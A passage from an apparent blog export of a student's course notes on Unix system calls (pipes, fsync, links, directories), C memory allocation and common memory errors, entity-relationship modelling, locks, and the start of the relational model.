<li>If the calling process is ignoring the signal, then <code>write()</code> fails with the error EPIPE.</li>
</ul>
</li>
</ul>
</li>
<li><p>Syntax: <code>int pipe(int* fd);</code></p>
<ul>
<li><code>fd[0]</code>: the read end</li>
<li><code>fd[1]</code>: the write end</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>Success: return <code>0</code></li>
<li>Error: return <code>-1</code></li>
</ul>
</li>
<li><p>Example:</p>
<ul>
<li>counting the lines of output in executing <code>ls -l</code>  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 7-pipe */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">main()&#123;</span><br><span class="line">    <span class="type">int</span> fd[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="type">char</span> *cmd;</span><br><span class="line">    <span class="type">char</span> *argv[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">    pipe(fd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((ret=fork()) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            Parent Process</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            We want to use parent process executes &quot;ls -l&quot;, so do redirection</span></span><br><span class="line"><span class="comment">            We want to redirect the standard output to the write end of pipe</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        close(<span class="number">1</span>);		<span class="comment">// close standard output</span></span><br><span class="line">        dup(fd[<span class="number">1</span>]);		<span class="comment">// fd[1] is duplicated to standard output</span></span><br><span class="line">        close(fd[<span class="number">0</span>]);</span><br><span class="line">        close(fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        cmd = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">        argv[<span class="number">0</span>] = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">        argv[<span class="number">1</span>] = <span class="string">&quot;-l&quot;</span>;</span><br><span class="line">        argv[<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        execvp(cmd, argv);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(ret == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            Child Process</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            We want to use child process executes &quot;wc -l&quot;, so do redirection</span></span><br><span class="line"><span class="comment">            We want to redirect the standard input to the read end of pipe</span></span><br><span class="line"><span class="comment">                to get the input from the parent process</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        close(<span class="number">0</span>);		<span class="comment">// close standard input</span></span><br><span class="line">        dup(fd[<span class="number">0</span>]);		<span class="comment">// fd[0] is duplicated to standard input</span></span><br><span class="line">        close(fd[<span class="number">0</span>]);</span><br><span class="line">        close(fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        cmd = <span class="string">&quot;wc&quot;</span>;</span><br><span class="line">        argv[<span class="number">0</span>] = <span class="string">&quot;wc&quot;</span>;</span><br><span class="line">        argv[<span class="number">1</span>] = <span class="string">&quot;-l&quot;</span>;</span><br><span class="line">        argv[<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        execvp(cmd, argv);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Other-Operations"><a href="#Other-Operations" class="headerlink" title="Other Operations"></a>Other Operations</h2><h3 id="fsync-Write-Immdeiately"><a href="#fsync-Write-Immdeiately" class="headerlink" title="fsync Write Immdeiately"></a><code>fsync</code> Write Immdeiately</h3><ul>
<li><p>Description:</p>
<ul>
<li>The file system will buffer writes in memorys for some time, so the write(s) will actually be issued to the storage device, like data lost.</li>
<li><code>fsync</code> system call forces all dirty data written to disk immediately, and returns after all these writes were completed.</li>
</ul>
</li>
<li><p>Syntax: <code>int fsync(int fd)</code></p>
</li>
<li><p>Return:</p>
<ul>
<li>Success: return <code>0</code></li>
<li>Error: return <code>-1</code></li>
</ul>
</li>
</ul>
<h3 id="rename-Rename-File"><a href="#rename-Rename-File" class="headerlink" title="rename Rename File"></a><code>rename</code> Rename File</h3><ul>
<li><p>Syntax: <code>rename(char* old, char* new)</code></p>
</li>
<li><p>Example:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;foo.txt.tmp&quot;</span>, O_WRONLY | O_CREAT | O_TRUNC, S_IRWXU);</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">20</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">write(fd, buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">fsync(fd);</span><br><span class="line">close(fd);</span><br><span class="line">rename(<span class="string">&quot;foo.txt.tmp&quot;</span>, <span class="string">&quot;foo.txt&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="fstat-Show-Information"><a href="#fstat-Show-Information" class="headerlink" title="fstat Show Information"></a><code>fstat</code> Show Information</h3><ul>
<li><p>Show the file metadata (the information about the file).</p>
</li>
<li><p>Structure:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> &#123;</span></span><br><span class="line">    <span class="type">dev_t</span> st_dev; 	<span class="comment">/* ID of device containing file */</span></span><br><span class="line">    <span class="type">ino_t</span> st_ino; 	<span class="comment">/* inode number */</span></span><br><span class="line">    <span class="type">mode_t</span> st_mode; 	<span class="comment">/* protection */</span></span><br><span class="line">    <span class="type">nlink_t</span> st_nlink; 	<span class="comment">/* number of hard links */</span></span><br><span class="line">    <span class="type">uid_t</span> st_uid; 	<span class="comment">/* user ID of owner */</span></span><br><span class="line">    <span class="type">gid_t</span> st_gid; 	<span class="comment">/* group ID of owner */</span></span><br><span class="line">    <span class="type">dev_t</span> st_rdev; 	<span class="comment">/* device ID (if special file) */</span></span><br><span class="line">    <span class="type">off_t</span> st_size; 	<span class="comment">/* total size, in bytes */</span></span><br><span class="line">    <span class="type">blksize_t</span> st_blksize; <span class="comment">/* blocksize for filesystem I/O */</span></span><br><span class="line">    <span class="type">blkcnt_t</span> st_blocks; 	<span class="comment">/* number of blocks allocated */</span></span><br><span class="line">    <span class="type">time_t</span> st_atime; 	<span class="comment">/* time of last access */</span></span><br><span class="line">    <span class="type">time_t</span> st_mtime; 	<span class="comment">/* time of last modification */</span></span><br><span class="line">    <span class="type">time_t</span> st_ctime; 	<span class="comment">/* time of last status change */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

</li>
<li><p>Example:</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> hello &gt; file   <span class="comment"># create and write &quot;hello&quot; into file</span></span><br><span class="line"><span class="built_in">stat</span> file   <span class="comment"># show the information of file</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Directories-Operations"><a href="#Directories-Operations" class="headerlink" title="Directories Operations"></a>Directories Operations</h2><ol>
<li><p>Create Directories</p>
<ul>
<li><code>mkdir</code> system call</li>
<li>Make an empty directory, which contains two entries: <code>.</code>(itself) and <code>..</code>(parent).</li>
</ul>
</li>
<li><p>Read Directories</p>
<ul>
<li><code>opendir</code> system call: open directory</li>
<li><code>readdir</code> system call: read directory entries (similar to <code>ls</code>).</li>
</ul>
</li>
<li><p>Remove Directories</p>
<ul>
<li><code>rmdir</code> system call</li>
<li><font color="f54747">It requires the directory is empty</font>.</li>
</ul>
</li>
</ol>
<ul>
<li>Example:  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dirent.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span>&#123;</span><br><span class="line">    DIR *dp = opendir(<span class="string">&quot;.&quot;</span>);             <span class="comment">// open current directory</span></span><br><span class="line">    assert(dp != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">d</span>;</span></span><br><span class="line">    <span class="keyword">while</span> ((d = readdir(dp)) != <span class="literal">NULL</span>)   <span class="comment">// read one directory entry </span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// print outthe name and inode number of each file</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d %s\n&quot;</span>, (<span class="type">int</span>) d-&gt;d_ino, d-&gt;d_name);</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(dp);                       <span class="comment">// close current directory</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h2><h3 id="Hard-Links"><a href="#Hard-Links" class="headerlink" title="Hard Links"></a>Hard Links</h3><ul>
<li><p>Description:</p>
<ul>
<li><p>Creare another name in the directory and refer it to the <font color="f54747">same inode number (same file)</font> of the original file.</p>
</li>
<li><p>Noted: <font color="f54747">Hard link does not really create a file, it just creates a link which linking to the original file</font>.</p>
</li>
<li><p>Editting the old file would change the content in new file.</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> hello &gt; file</span><br><span class="line"><span class="built_in">ln</span> file file2       <span class="comment"># create a hard link, link file to file2</span></span><br><span class="line"><span class="built_in">echo</span> helloworld &gt; file</span><br><span class="line"><span class="built_in">cat</span> file2           <span class="comment"># helloworld</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">ls</span> -i file file2</span><br><span class="line">4633749 file	4633749 file2   <span class="comment"># they have the same inode value</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Syntax: </p>
<ul>
<li>system call: <code>link(char* &quot;oldpath&quot;, char* &quot;newpath&quot;);</code></li>
<li>command: <code>ln oldpath newpath</code></li>
</ul>
</li>
<li><p>Remove File:</p>
<ul>
<li>That’s why we call <code>unlink</code> to remove file.  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> hello &gt; file</span><br><span class="line"><span class="built_in">ln</span> file file2       <span class="comment"># create a hard link, link file2 to file</span></span><br><span class="line"><span class="built_in">rm</span> file             <span class="comment"># remove file</span></span><br><span class="line"><span class="built_in">cat</span> file2           <span class="comment"># file2 can still access the file</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="Symbolic-Links-Soft-Link"><a href="#Symbolic-Links-Soft-Link" class="headerlink" title="Symbolic Links (Soft Link)"></a>Symbolic Links (Soft Link)</h3><ul>
<li><p>Description:</p>
<ul>
<li>It can create for a directory (hard link cannot).  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> foo</span><br><span class="line"><span class="built_in">ln</span> foo foo1     <span class="comment"># ln: foo: Is a directory</span></span><br><span class="line"><span class="built_in">ln</span> -s foo foo1</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>Difference:</p>
<ol>
<li>File system knows that symbolic link is a <font color="f54747">third type</font> (different type), so <font color="f54747">symbolic link does just create a new file</font>.</li>
<li>The size of symbolic link is <font color="f54747">4 bytes</font> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -a</span><br><span class="line"><span class="comment"># -rw-r--r--   ...   6   file</span></span><br><span class="line"><span class="comment"># lrwxr-xr-x   ...   4   file2 -&gt; file</span></span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>Remove File:</p>
<ul>
<li>When the original file was removed, symbolic link points nothing  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> hello &gt; file</span><br><span class="line"><span class="built_in">ln</span> -s file file2</span><br><span class="line"><span class="built_in">rm</span> file</span><br><span class="line"><span class="built_in">cat</span> file2           <span class="comment"># cat: file2: No such file or directory</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>System Call (Memory)</title>
    <url>/myBlog/2022/09/18/2022/CSCI3150/2022-9-17-CSCI3150-SystemCall-Memory/</url>
    <content><![CDATA[<h2 id="Memory-Allocation"><a href="#Memory-Allocation" class="headerlink" title="Memory Allocation"></a>Memory Allocation</h2><h3 id="Memory-API-malloc"><a href="#Memory-API-malloc" class="headerlink" title="Memory API malloc"></a>Memory API <code>malloc</code></h3><ul>
<li><p>Description:</p>
<ul>
<li>Allocate a memory region on the <font color="7B3279">heap</font>.</li>
</ul>
</li>
<li><p>Syntax: <code>void* malloc(size_t size)</code></p>
<ul>
<li><code>size_t size</code>: the size of the memory block (in bytes)</li>
<li><code>size_t</code>: is an unsigned integer type</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>Success: a void type pointer to the memory block allocated by <code>malloc</code></li>
<li>Fail: a null pointer</li>
</ul>
</li>
</ul>
<h3 id="Function-sizeof"><a href="#Function-sizeof" class="headerlink" title="Function sizeof"></a>Function <code>sizeof</code></h3><ul>
<li>Description:<ul>
<li><p>Usually use <code>size</code> in <code>malloc</code> instead of typing a number.</p>
</li>
<li><p>Two types of results of <code>sizeof</code></p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* The actual size of &#x27;x&#x27; is known at run-time */</span></span><br><span class="line"><span class="type">int</span> *x = <span class="built_in">malloc</span>(<span class="number">10</span> * <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="keyword">sizeof</span>(x))       <span class="comment">// 4 (size of a pointer)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The actual size of &#x27;y&#x27; is known at compile-time */</span></span><br><span class="line"><span class="type">int</span> y[<span class="number">10</span>]</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="keyword">sizeof</span>(y))       <span class="comment">// 40 (y is static)</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h3 id="Memory-API-free"><a href="#Memory-API-free" class="headerlink" title="Memory API free"></a>Memory API <code>free</code></h3><ul>
<li><p>Description:</p>
<ul>
<li>To free a memory region allocated by a call to <code>malloc</code>.</li>
</ul>
</li>
<li><p>Syntax: <code>void free(void *ptr)</code></p>
<ul>
<li><code>void *ptr</code> is a pointer to a memory block allocated with <code>malloc</code></li>
</ul>
</li>
<li><p>Return <code>none</code></p>
</li>
</ul>
<h3 id="Memory-API-calloc"><a href="#Memory-API-calloc" class="headerlink" title="Memory API calloc"></a>Memory API <code>calloc</code></h3><ul>
<li><p>Description:</p>
<ul>
<li>Allocate memory on the <font color="7B3279">heap</font> and set with <font color="7B3279">zero</font> before returning.</li>
</ul>
</li>
<li><p>Syntax: <code>void* calloc(size_t num, size_t size)</code></p>
<ul>
<li><code>size_t num</code>: number of block to allocate</li>
<li><code>size_t size</code>: size of each block (in bytes)</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>Success: a void type pointer to memory block allocated by <code>calloc</code></li>
<li>Fail: a null pointer</li>
</ul>
</li>
</ul>
<h3 id="Memory-API-realloc"><a href="#Memory-API-realloc" class="headerlink" title="Memory API realloc"></a>Memory API <code>realloc</code></h3><ul>
<li><p>Description:</p>
<ul>
<li>Change the size of memory block.</li>
</ul>
</li>
<li><p>Syntax: <code>void* realloc(void *ptr, size_t size)</code></p>
<ul>
<li><code>void *ptr</code>: pointer to memory block allocated with <code>malloc</code>, <code>calloc</code> or <code>realloc</code></li>
<li><code>size_t size</code>: new size for the memory block (in bytes)</li>
</ul>
</li>
<li><p>Return:</p>
<ul>
<li>Success: a void type pointer to memory block</li>
<li>Fail: a null pointer</li>
</ul>
</li>
</ul>
<h2 id="Common-Error"><a href="#Common-Error" class="headerlink" title="Common Error"></a>Common Error</h2><h3 id="Forget-To-Allocate-Memory"><a href="#Forget-To-Allocate-Memory" class="headerlink" title="Forget To Allocate Memory"></a>Forget To Allocate Memory</h3><ul>
<li><p>Description:</p>
<ul>
<li>created a pointer but forgot to allocate the memory</li>
<li>if operating (e.g. <code>strcpy</code>) that pointer, then it reports an error</li>
</ul>
</li>
<li><p>Incorrect Code (Error):</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Incorrect Code */</span></span><br><span class="line"><span class="type">char</span> *src = <span class="string">&quot;hello&quot;</span>;    <span class="comment">// character string constant</span></span><br><span class="line"><span class="type">char</span> *dst;              <span class="comment">// unallocated</span></span><br><span class="line"><span class="built_in">strcpy</span>(dst, src);       <span class="comment">// segfault and die</span></span><br></pre></td></tr></table></figure>
  <img src="https://p.ipic.vip/5lvhn0.png" height="250px">

</li>
<li><p>Correct Code:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *src = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="type">char</span> *dst = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(src) + <span class="number">1</span>);    <span class="comment">// allocated</span></span><br><span class="line"><span class="built_in">strcpy</span>(dst, src);</span><br></pre></td></tr></table></figure>
  <img src="https://p.ipic.vip/4vepuz.png" height="250px"></li>
</ul>
<h3 id="Allocated-Small-Memory"><a href="#Allocated-Small-Memory" class="headerlink" title="Allocated Small Memory"></a>Allocated Small Memory</h3><ul>
<li><p>Description:</p>
<ul>
<li>do not allocate the pointer with enough memory</li>
<li>it works properly</li>
</ul>
</li>
<li><p>Incorrect Code (but work properly):</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *src = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="type">char</span> *dst = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(src));    <span class="comment">// too small</span></span><br><span class="line"><span class="built_in">strcpy</span>(dst, src);</span><br></pre></td></tr></table></figure>
  <img src="https://p.ipic.vip/tirikq.png" height="250px"></li>
</ul>
<h3 id="Forget-to-Initialize"><a href="#Forget-to-Initialize" class="headerlink" title="Forget to Initialize"></a>Forget to Initialize</h3><ul>
<li><p>Description:</p>
<ul>
<li>use an uninitialized the pointer</li>
<li>it will <font colro="f54747">allocate with the value used before</font></li>
</ul>
</li>
<li><p>Incorrect Code:</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *x = (<span class="type">int</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));   <span class="comment">// allocated</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;*x = %d\n&quot;</span>, *x);               <span class="comment">// uninitialized memory access</span></span><br></pre></td></tr></table></figure>
  <img src="https://p.ipic.vip/ue92hb.png" height="250px"></li>
</ul>
<h3 id="Memory-Leak"><a href="#Memory-Leak" class="headerlink" title="Memory Leak"></a>Memory Leak</h3><ul>
<li>Description:<ul>
<li>do not <code>free</code> the used memory access</li>
<li>the program will run out of memory  <img src="https://p.ipic.vip/kkfjbf.png" height="250px"></li>
</ul>
</li>
</ul>
<h3 id="Dangling-Pointer-迷途指針"><a href="#Dangling-Pointer-迷途指針" class="headerlink" title="Dangling Pointer 迷途指針"></a>Dangling Pointer 迷途指針</h3><ul>
<li>Description:<ul>
<li>freeing the memory before it is finished using</li>
<li>the program accesses to that memory with invalid pointer  <img src="https://p.ipic.vip/13k2pf.png" height="250px"></li>
</ul>
</li>
</ul>
<h3 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h3><ul>
<li>Description:<ul>
<li>Free the memory that was freed before</li>
<li>it reports an undefined error  <img src="https://p.ipic.vip/70g8sl.png" height="150px"></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>Entity-Relationship Model</title>
    <url>/myBlog/2023/01/28/2023/CSCI3170/2023-1-28-CSCI3170-ERModel/</url>
    <content><![CDATA[<h2 id="Entity-Relationship-Diagrams"><a href="#Entity-Relationship-Diagrams" class="headerlink" title="Entity-Relationship Diagrams"></a>Entity-Relationship Diagrams</h2><img src="https://p.ipic.vip/y43qkp.jpg" width="500px" />

<ol>
<li><p><font color="3A75EA"><strong>Entity Type</strong></font></p>
<ul>
<li>an object in the real world that is distinguishable from other objects <img src="https://p.ipic.vip/73xd6j.png" width="100px" /></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Entity Set</strong></font></p>
<ul>
<li>a collection of entities of the same type <img src="https://p.ipic.vip/azcz7x.png" width="100px" /></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Attributes</strong></font></p>
<ul>
<li>the properties that define the entity type <img src="https://p.ipic.vip/acwaqs.png" width="100px" /></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Key Attribute</strong></font></p>
<ul>
<li>a uniquely identifies each entity in the entity set <img src="https://p.ipic.vip/yyaazr.png" width="100px" /></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Relationship Type</strong></font></p>
<ul>
<li>represents the association between entity types <img src="https://p.ipic.vip/cjmfqr.png" width="300px" /></li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Relationship Set</strong></font></p>
 <img src="https://p.ipic.vip/pjfz1o.png" width="300px" /></li>
</ol>
<h2 id="Key"><a href="#Key" class="headerlink" title="Key"></a>Key</h2><ol>
<li><p><font color="3A75EA"><strong>Super key</strong></font></p>
<ul>
<li>A superkey is <font color="F54747">any set of one or more attributes</font> that can uniquely identify an entity in a table.</li>
<li>It doesn’t have to be the smallest set of attributes that can do so.</li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Candidate key</strong></font></p>
<ul>
<li>A candidate key is a superkey for which no proper subset is also a superkey.</li>
<li>It is a <font color="F54747">minimal set of attributes</font> that can uniquely identify an entity in a table.</li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Primary key</strong></font></p>
<ul>
<li>A primary key is a candidate key that has been selected as the main key for a table.</li>
<li>There can only be <font color="F54747">one primary key</font> per table.</li>
</ul>
</li>
</ol>
<h2 id="Constraints"><a href="#Constraints" class="headerlink" title="Constraints"></a>Constraints</h2><h3 id="Key-Constraints"><a href="#Key-Constraints" class="headerlink" title="Key Constraints"></a>Key Constraints</h3><ol>
<li><p>One-to-one</p>
<ul>
<li>An entity in A is associated with at most one entity in B.</li>
<li>An entity in B is associated with at most one entity in A.<ul>
<li>a man may be married to at most one woman, and a woman may be married to at most one man. <img src="https://p.ipic.vip/od5jt4.jpg" width="400px" /></li>
</ul>
</li>
</ul>
</li>
<li><p>One-to-many</p>
<ul>
<li>An entity in A is associated with any number in B.</li>
<li>An entity in B is associated with at most one entity in A.<ul>
<li>each child can have at most one mother, but a mother may have more than one children. <img src="https://p.ipic.vip/h0xmy9.jpg" width="400px" /></li>
</ul>
</li>
</ul>
</li>
<li><p>Many-to-one</p>
<ul>
<li>An entity in A is associated with at most one entity in B.</li>
<li>An entity in B is associated with any number in A.<ul>
<li>an employee can only work in at most one department, but a department has more than one employees. <img src="https://p.ipic.vip/gm063c.jpg" width="400px" /></li>
</ul>
</li>
</ul>
</li>
<li><p>Many-to-many</p>
<ul>
<li>Entities in A and B are associated with any number from each other.<ul>
<li>both boy and girl can have more than one girl and boy classmates resepectively. <img src="https://p.ipic.vip/w7w9d3.jpg" width="400px" /></li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="Participation-Constraints"><a href="#Participation-Constraints" class="headerlink" title="Participation Constraints"></a>Participation Constraints</h3><ul>
<li><p>The example of a one-to-one key constraint, noting that a man may be married to at most one woman, and a woman may be married to at most one man (<font color="3A75EA">both men and women can be unmarried</font>). Suppose we want to build a database for the “Married Persons Association”. In this case everyone must be married! In database terms their participation must be <font color="F54747">total</font>.</p>
</li>
<li><p>If the participation of an entity set in a relationship set is total, they must be connected by a <font color="F54747">bold</font> link.</p>
</li>
</ul>
<img src="https://p.ipic.vip/926h4t.jpg" width="350px">



<h3 id="Weak-Entity"><a href="#Weak-Entity" class="headerlink" title="Weak Entity"></a>Weak Entity</h3><ul>
<li><p><font color="3A75EA"><strong>Strong Entity</strong></font></p>
<ul>
<li>An entity which has a <font color="3A75EA">super key</font>.</li>
<li>Each entity can be distinguished from other entities.</li>
</ul>
</li>
<li><p><font color="3A75EA"><strong>Weak Entity</strong></font></p>
<ul>
<li>An entity <font color="3A75EA">without super key</font> (only has a <font color="F54747">partial key</font>).</li>
<li>May not be able to distinguish from other entities <font color="3A75EA">without associations with entities in other entity sets</font>.</li>
</ul>
  <img src="https://p.ipic.vip/gsw7pf.jpg" width="600px" /></li>
</ul>
<h2 id="Other-Relationships"><a href="#Other-Relationships" class="headerlink" title="Other Relationships"></a>Other Relationships</h2><h3 id="Ternary-Relationships"><a href="#Ternary-Relationships" class="headerlink" title="Ternary Relationships"></a>Ternary Relationships</h3><ul>
<li><p>It is possible to have higher order relationships, including ternary relationships.</p>
  <img src="https://p.ipic.vip/wd0rmm.jpg" width="500px" />
</li>
<li><p><font color="F54747">NOTED</font>: Every ternary (and higher order) relationship can be converted into a set of binary relationships.</p>
  <img src="https://p.ipic.vip/2w87qt.jpg" />
</li>
<li><p><font color="F54747">NOTED</font>: A non-binary relationship set cannot be replaced by a number of binary relationship sets.<br><font color="F54747"><strong>The ternary relationship cannot be convert into these relationships !!!</strong></font></p>
  <img src="https://p.ipic.vip/pegxds.jpg" width="400px" /></li>
</ul>
<h3 id="Class-Hierarchies"><a href="#Class-Hierarchies" class="headerlink" title="Class Hierarchies"></a>Class Hierarchies</h3><ul>
<li>Sometimes it is natural to classify the entities in an entity set into <font color="3A75EA">subclasses</font>.  <img src="https://p.ipic.vip/vgumem.jpg" width="400px" /></li>
</ul>
<h3 id="Aggregation"><a href="#Aggregation" class="headerlink" title="Aggregation"></a>Aggregation</h3><ul>
<li>Model a relationship between a collection of entities and relationships.</li>
<li>Aggregation allows us to indicate that a relationship set participates in another relationship set.  <img src="https://p.ipic.vip/nnszjq.jpg" width="400px" /></li>
</ul>
<!-- <font color="3A75EA">Blue</font>
<font color="F54747">Red</font> -->]]></content>
      <categories>
        <category>CSCI3170</category>
      </categories>
      <tags>
        <tag>database</tag>
      </tags>
  </entry>
  <entry>
    <title>Concurrency (Lock &amp; Conditional Variable)</title>
    <url>/myBlog/2022/12/07/2022/CSCI3150/2022-12-7-CSCI3150-Concurrency-Lock-ConditionalVariable.md/</url>
    <content><![CDATA[<h2 id="Lock"><a href="#Lock" class="headerlink" title="Lock"></a>Lock</h2><h3 id="mutex"><a href="#mutex" class="headerlink" title="mutex"></a>mutex</h3><ul>
<li>Used to provide mutual exclusion between threads</li>
<li>We may use <font color="3A75EA">different locks</font> to protect <font color="3A75EA">different variables</font>, to increase concurrency</li>
</ul>
<h3 id="Design-Lock"><a href="#Design-Lock" class="headerlink" title="Design Lock"></a>Design Lock</h3><ul>
<li><p>Evaluating Locks</p>
<ol>
<li><p>Mutual Exclusion</p>
<ul>
<li>it can prevent multiple threads from entering a critical section.</li>
</ul>
</li>
<li><p>Fairness</p>
<ul>
<li>each thread gets a fair shot at acquiring the lock if the lock is free.</li>
</ul>
</li>
<li><p>Performance</p>
<ul>
<li>the time overheads added by using the lock</li>
</ul>
</li>
</ol>
</li>
<li><p>Controlling Interrupts</p>
<ul>
<li><font color="3A75EA"><strong>Disable Interrupts</strong></font> for critical sections<ul>
<li>the earliest solution to provide mutual exclusion</li>
<li>invented for single processor systems.</li>
<li>Problems:<ol>
<li>Do not work on multiprocessors</li>
<li>Code that masks or unmasks interrupts be executed slowly by modern CPUs</li>
</ol>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>CSCI3150</category>
      </categories>
      <tags>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>Relational Model</title>
    <url>/myBlog/2023/02/15/2023/CSCI3170/2023-2-15-CSCI3170-RelationalModel/</url>
    <content><![CDATA[<style>
.block {
    width: 80px;
}
</style>

<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><h3 id="Relations"><a href="#Relations" class="headerlink" title="Relations"></a>Relations</h3><ol>
<li><p>Relation Schema</p>
<ul>
<li>the column heads for the table which contains <font color="3A75EA">name of each field</font> and the <font color="3A75EA">domain of each field</font><ul>
